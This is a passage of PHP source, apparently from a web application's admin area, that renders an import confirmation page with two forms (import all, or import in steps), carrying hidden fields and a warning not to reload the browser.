  If PHP is running is a safe mode or if you are not sure, click the button <b>Import '.$step.' '.$what1.'</b>.
  </td></tr>
  <tr>
  <td align="center" width="50%">
  <form method="post" action="'.$script_name.'">'.check_field_create('admin').'
  <input type="hidden" name="action" value="'.$function_name.'">
  <input type="hidden" name="what" value="'.$data[what].'">
  <input type="hidden" name="total_items" value="'.$pocet.'">
  <input type="hidden" name="special_import" value="'.$data[special_import].'">
  <input type="hidden" name="separator" value="'.$data[separator].'">';
  foreach ($data[rank] as $k=>$v) echo '<input type="hidden" name="rank['.$k.']" value="'.$v.'">';
  echo '<input type="submit" name="submit" value="Import all '.$what1.'" class="button10">
  </form>
  </td>
  <td align="center" width="50%">
  <form method="post" action="'.$script_name.'">'.check_field_create('admin').'
  <input type="hidden" name="action" value="'.$function_name.'">
  <input type="hidden" name="what" value="'.$data[what].'">
  <input type="hidden" name="total_items" value="'.$pocet.'">
  <input type="hidden" name="special_import" value="'.$data[special_import].'">
  <input type="hidden" name="separator" value="'.$data[separator].'">
  <input type="hidden" name="from" value="1">
  <input type="hidden" name="step" value="'.$step.'">';
  foreach ($data[rank] as $k=>$v) echo '<input type="hidden" name="rank['.$k.']" value="'.$v.'">';
  echo '<input type="submit" name="submit" value="Import '.$step.' '.$what1.'" class="button10">
  </form>
  </td>
  </tr></table>
  </td></tr></table>
  ';
}
echo '<br><br><br>'.info_line('<br>Important note:','Never hit your browser\'s "Reload" or "Back" button, otherwise some '.$what1.' may be created more than once.');
ift();
}

#############################################################################

?>